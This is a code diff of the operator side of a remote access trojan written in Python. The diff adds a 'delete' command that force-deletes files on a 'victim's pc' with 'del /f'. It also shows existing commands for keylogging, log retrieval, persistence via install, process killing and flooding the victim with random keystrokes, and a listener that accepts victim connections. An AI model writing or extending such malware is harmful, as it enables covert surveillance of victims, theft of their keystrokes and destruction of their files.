@@ -22,7 +22,8 @@ session_ids = []
 
 # saves all the command
 COMMANDS = ["help", "sessions"]
-SESSION_COMMANDS = ["help", "back", "tree", "install", "matrix", "disconnect", "ps", "kill", "keylogger", "getlogs", "keybind", "msg", "statlights"]
+SESSION_COMMANDS = ["help", "back", "tree", "install", "matrix", "disconnect", "ps", "kill", "keylogger", "getlogs",
+                    "keybind", "msg", "statlights", "delete"]
 
 
 class Commands:
@@ -212,13 +213,28 @@ class Commands:
                 return
         # deletes a file in given path
         elif message == "delete":
-            pass
+            if args:
+                deleted = sendMessage(f"c o del /f {args[0]}")
+                if deleted == "done":
+                    print("Done")
+                else:
+                    print("Path couldnt be found")
+                    return
+            elif not args:
+                print("You need a path type 'help' for more")
+                return
+            else:
+                print("to many arguments type 'help' for more")
+                return
 
-        # sends a keybind
+                # sends a keybind
         elif message == "keybind":
-            special_keys = {"ctrl": "Key.ctrl", "windows": "Key.cmd", "alt": "Key.alt_l", "alt_gr": "Key.alt_gr", "back": "Key.backspace",
-                            "caps": "Key.caps_lock", "num": "Key.num_lock", "shift": "Key.shift", "esc": "Key.esc", "enter": "Key.enter",
-                            "del": "Key.delete", "insert": "Key.insert", "tab": "Key.tab", "volDown": "Key.media_volume_down", "volUp": "Key.media_volume_up"}
+            special_keys = {"ctrl": "Key.ctrl", "windows": "Key.cmd", "alt": "Key.alt_l", "alt_gr": "Key.alt_gr",
+                            "back": "Key.backspace",
+                            "caps": "Key.caps_lock", "num": "Key.num_lock", "shift": "Key.shift", "esc": "Key.esc",
+                            "enter": "Key.enter",
+                            "del": "Key.delete", "insert": "Key.insert", "tab": "Key.tab",
+                            "volDown": "Key.media_volume_down", "volUp": "Key.media_volume_up"}
             # checks for arguments
             if args:
                 keysStr = args[0]
@@ -256,7 +272,7 @@ class Commands:
             for i in range(0, 1000):
                 key = randint(0, 1)
                 sendMessage(f"k b {keys[key]}")
-                #sleep(0.2)
+                # sleep(0.2)
 
         # disconnects and closes the shell script on the victims pc(if installed it will reconnect after restart of the victims pc)
         elif message == "disconnect":
@@ -333,7 +349,8 @@ def startListening():
     while True:
         conn, addr = server.accept()
         id_num = len(sessions)
-        sessions.update({str(id_num): {"id": f"{id_num}", "name": f"session{id_num}", "connection": (conn, addr), "pyinstall": False}})
+        sessions.update({str(id_num): {"id": f"{id_num}", "name": f"session{id_num}", "connection": (conn, addr),
+                                       "pyinstall": False}})
         session_ids.append(str(id_num))
         print(f"[CONNECTION] New connection from {addr[0]}")
         startListening()
